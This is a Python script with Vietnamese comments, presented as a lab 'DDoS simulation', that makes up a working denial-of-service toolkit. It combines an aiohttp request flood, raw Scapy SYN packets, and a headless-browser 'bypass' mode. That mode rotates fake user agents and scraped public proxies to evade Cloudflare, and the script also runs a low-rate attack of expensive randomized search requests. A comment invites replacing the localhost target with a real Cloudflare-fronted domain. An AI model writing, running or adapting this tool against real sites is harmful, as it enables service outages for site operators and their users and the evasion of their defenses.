import asyncio
import aiohttp
import requests
from fake_useragent import UserAgent
import time
import logging
import random
import json
import matplotlib.pyplot as plt
import pandas as pd
from datetime import datetime
import proxyscrape
from scapy.all import *
import csv
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# Thiết lập logging
logging.basicConfig(
    filename='ddos_simulation.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Cấu hình
TARGET_URL = "http://localhost:8080"  # Thay bằng URL máy chủ lab hoặc tên miền qua Cloudflare
REQUEST_COUNT = 100  # Số yêu cầu cho HTTP/2 Flooder
LOW_RPS_INTERVAL = 5  # Khoảng cách giữa các yêu cầu Low RPS (giây)
USER_AGENT_FILE = "user_agents.txt"  # File chứa danh sách User-Agent

# Tải User-Agent từ file hoặc tạo ngẫu nhiên
def load_user_agents():
    if os.path.exists(USER_AGENT_FILE):
        with open(USER_AGENT_FILE, 'r') as f:
            user_agents = [line.strip() for line in f if line.strip()]
        if user_agents:
            logging.info(f"Loaded {len(user_agents)} User-Agents from {USER_AGENT_FILE}")
            return user_agents
    logging.warning("User-Agent file not found, generating random User-Agents")
    return [UserAgent().random for _ in range(20)]

USER_AGENTS = load_user_agents()

# Lấy proxy thực tế
def get_proxies():
    try:
        collector = proxyscrape.create_collector('default', 'http')
        proxies = [f"http://{proxy.host}:{proxy.port}" for proxy in collector.get_proxies()]
        logging.info(f"Loaded {len(proxies)} proxies")
        return proxies
    except Exception as e:
        logging.error(f"Failed to load proxies: {str(e)}")
        return []

PROXY_LIST = get_proxies()

# Thiết lập headless browser
def setup_headless_browser(user_agent):
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument(f'user-agent={user_agent}')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    driver = webdriver.Chrome(options=chrome_options)
    return driver

# Hàm mô phỏng HTTP/2 Flooder với Scapy và aiohttp
async def http2_flooder():
    async with aiohttp.ClientSession() as session:
        logging.info("Bắt đầu mô phỏng HTTP/2 Flooder")
        tasks = []
        logs = []

        # Mô phỏng gói tin HTTP/2 với Scapy
        def send_scapy_packet():
            try:
                target_ip = TARGET_URL.split("//")[-1].split("/")[0]
                packet = IP(dst=target_ip)/TCP(dport=80, sport=random.randint(1024, 65535), flags="S")
                send(packet, verbose=0)
                logging.info(f"Scapy HTTP/2 Packet sent to {target_ip}")
                return {'timestamp': datetime.now().isoformat(), 'type': 'http2_scapy', 'status': 'sent', 'headers': {}, 'response_time': 0}
            except Exception as e:
                logging.error(f"Scapy HTTP/2 Packet failed: {str(e)}")
                return {'timestamp': datetime.now().isoformat(), 'type': 'http2_scapy', 'status': 'error', 'error': str(e), 'response_time': 0}

        async def send_aiohttp_request():
            try:
                start_time = time.time()
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                async with session.get(TARGET_URL, headers=headers) as response:
                    response_time = time.time() - start_time
                    log_entry = {
                        'timestamp': datetime.now().isoformat(),
                        'type': 'http2_aiohttp',
                        'status': response.status,
                        'headers': dict(response.headers),
                        'response_time': response_time
                    }
                    logging.info(f"HTTP/2 Request - Status: {response.status}, Headers: {json.dumps(dict(response.headers))}, Response Time: {response_time:.2f}s")
                    return log_entry
            except Exception as e:
                response_time = time.time() - start_time
                logging.error(f"HTTP/2 Request failed: {str(e)}")
                return {'timestamp': datetime.now().isoformat(), 'type': 'http2_aiohttp', 'status': 'error', 'error': str(e), 'response_time': response_time}

        # Gửi gói tin Scapy và aiohttp
        for _ in range(REQUEST_COUNT):
            tasks.append(send_aiohttp_request())
            logs.append(send_scapy_packet())

        aiohttp_responses = await asyncio.gather(*tasks, return_exceptions=True)
        logs.extend(aiohttp_responses)
        return logs

# Hàm mô phỏng HTTP-DDoS Bypass với headless browser
def http_ddos_bypass():
    logging.info("Bắt đầu mô phỏng HTTP-DDoS Bypass với headless browser")
    logs = []

    for i in range(5):  # Giảm số yêu cầu vì headless browser chậm hơn
        try:
            start_time = time.time()
            user_agent = random.choice(USER_AGENTS)
            proxy = random.choice(PROXY_LIST) if PROXY_LIST else None

            driver = setup_headless_browser(user_agent)
            if proxy:
                driver.set_page_load_timeout(10)
                driver.get(f"http://{proxy.split('//')[-1]}")  # Proxy không trực tiếp qua Selenium, mô phỏng hành vi

            driver.get(TARGET_URL)
            time.sleep(random.uniform(1, 3))  # Giả lập hành vi người dùng (di chuột, cuộn trang)
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")

            # Kiểm tra trạng thái và header
            status = 200  # Selenium không trả mã trạng thái trực tiếp, giả định 200 nếu tải được
            headers = {}
            if "cloudflare" in driver.page_source.lower():
                headers['cf-ray'] = 'detected'
                logging.info(f"Bypass Request {i+1}: Cloudflare detected in page source")
                if "403" in driver.page_source or "Access denied" in driver.page_source:
                    status = 403
                    logging.warning(f"Bypass Request {i+1}: Blocked by Cloudflare (403)")
                elif "429" in driver.page_source:
                    status = 429
                    logging.warning(f"Bypass Request {i+1}: Rate limited (429)")

            response_time = time.time() - start_time
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'http_ddos_bypass',
                'status': status,
                'headers': headers,
                'response_time': response_time,
                'proxy': proxy if proxy else 'None'
            }
            logging.info(f"Bypass Request {i+1} - Status: {status}, Headers: {json.dumps(headers)}, Response Time: {response_time:.2f}s, Proxy: {proxy}")
            logs.append(log_entry)

            driver.quit()
        except Exception as e:
            response_time = time.time() - start_time
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'http_ddos_bypass',
                'status': 'error',
                'error': str(e),
                'response_time': response_time,
                'proxy': proxy if proxy else 'None'
            }
            logging.error(f"Bypass Request {i+1} failed: {str(e)}, Response Time: {response_time:.2f}s")
            logs.append(log_entry)
            if 'driver' in locals():
                driver.quit()

        time.sleep(random.uniform(0.5, 2))

    return logs

# Hàm mô phỏng Low RPS
def low_rps_attack():
    logging.info("Bắt đầu mô phỏng Low RPS")
    session = requests.Session()
    logs = []

    for i in range(5):
        try:
            start_time = time.time()
            payload = {'query': 'complex_search_' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100))}
            headers = {'User-Agent': random.choice(USER_AGENTS)}

            response = session.post(TARGET_URL, data=payload, headers=headers, timeout=10)
            response_time = time.time() - start_time
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'low_rps',
                'status': response.status_code,
                'headers': dict(response.headers),
                'response_time': response_time
            }
            logging.info(f"Low RPS Request {i+1} - Status: {response.status_code}, Headers: {json.dumps(dict(response.headers))}, Response Time: {response_time:.2f}s")
            logs.append(log_entry)

            if 'cf-ray' in response.headers:
                logging.info(f"Low RPS Request {i+1}: Cloudflare detected (cf-ray: {response.headers['cf-ray']})")
            if 'server' in response.headers:
                logging.info(f"Low RPS Request {i+1}: Server: {response.headers['server']}")
            if response.status_code == 403:
                logging.warning(f"Low RPS Request {i+1}: Blocked by Cloudflare (403)")
            elif response.status_code == 429:
                logging.warning(f"Low RPS Request {i+1}: Rate limited (429)")
        except Exception as e:
            response_time = time.time() - start_time
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'type': 'low_rps',
                'status': 'error',
                'error': str(e),
                'response_time': response_time
            }
            logging.error(f"Low RPS Request {i+1} failed: {str(e)}, Response Time: {response_time:.2f}s")
            logs.append(log_entry)

        time.sleep(LOW_RPS_INTERVAL)

    return logs

# Hàm phân tích và xuất CSV
def analyze_and_export_csv(logs):
    logging.info("Phân tích và xuất CSV")
    df = pd.DataFrame(logs)

    # Xuất CSV
    csv_file = 'ddos_simulation_results.csv'
    df.to_csv(csv_file, index=False)
    logging.info(f"Exported results to {csv_file}")

    # Phân tích chi tiết
    status_counts = df.groupby(['type', 'status']).size().unstack(fill_value=0)
    response_times = df.groupby('type')['response_time'].agg(['mean', 'min', 'max']).fillna(0)
    cloudflare_detected = df[df['headers'].apply(lambda x: 'cf-ray' in x if isinstance(x, dict) else False)].groupby('type').size()

    print("Thống kê mã trạng thái:")
    print(status_counts)
    print("\nThống kê thời gian phản hồi (giây):")
    print(response_times)
    print("\nSố yêu cầu phát hiện Cloudflare (cf-ray):")
    print(cloudflare_detected)

    logging.info(f"Thống kê mã trạng thái:\n{status_counts.to_string()}")
    logging.info(f"Thống kê thời gian phản hồi:\n{response_times.to_string()}")
    logging.info(f"Số yêu cầu phát hiện Cloudflare:\n{cloudflare_detected.to_string()}")

    return df

# Hàm trực quan hóa
def plot_results(df):
    logging.info("Trực quan hóa kết quả")

    # Biểu đồ mã trạng thái
    plt.figure(figsize=(10, 6))
    status_counts = df.groupby(['type', 'status']).size().unstack(fill_value=0)
    status_counts.plot(kind='bar', stacked=True)
    plt.title('Phân tích mã trạng thái theo loại tấn công')
    plt.xlabel('Loại tấn công')
    plt.ylabel('Số lượng yêu cầu')
    plt.legend(title='Mã trạng thái')
    plt.tight_layout()
    plt.savefig('status_codes.png')
    plt.close()

    # Biểu đồ thời gian phản hồi
    plt.figure(figsize=(10, 6))
    for attack_type in df['type'].unique():
        subset = df[df['type'] == attack_type]
        plt.hist(subset['response_time'], bins=20, alpha=0.5, label=attack_type)
    plt.title('Phân bố thời gian phản hồi theo loại tấn công')
    plt.xlabel('Thời gian phản hồi (giây)')
    plt.ylabel('Số lượng yêu cầu')
    plt.legend()
    plt.tight_layout()
    plt.savefig('response_times.png')
    plt.close()

    logging.info("Generated plots: status_codes.png, response_times.png")

# Hàm chính
async def main():
    print(f"Bắt đầu thử nghiệm DDoS trong môi trường lab lúc {datetime.now()}")
    logging.info("Khởi động chương trình thử nghiệm DDoS")

    # Chạy các mô phỏng
    http2_logs = await http2_flooder()
    bypass_logs = http_ddos_bypass()
    low_rps_logs = low_rps_attack()

    # Kết hợp log
    all_logs = http2_logs + bypass_logs + low_rps_logs

    # Phân tích và xuất CSV
    df = analyze_and_export_csv(all_logs)

    # Trực quan hóa
    plot_results(df)

    print("Thử nghiệm hoàn tất. Kiểm tra các file:")
    print("- ddos_simulation.log (log chi tiết)")
    print("- ddos_simulation_results.csv (kết quả CSV)")
    print("- status_codes.png (biểu đồ mã trạng thái)")
    print("- response_times.png (biểu đồ thời gian phản hồi)")

if __name__ == "__main__":
    asyncio.run(main())
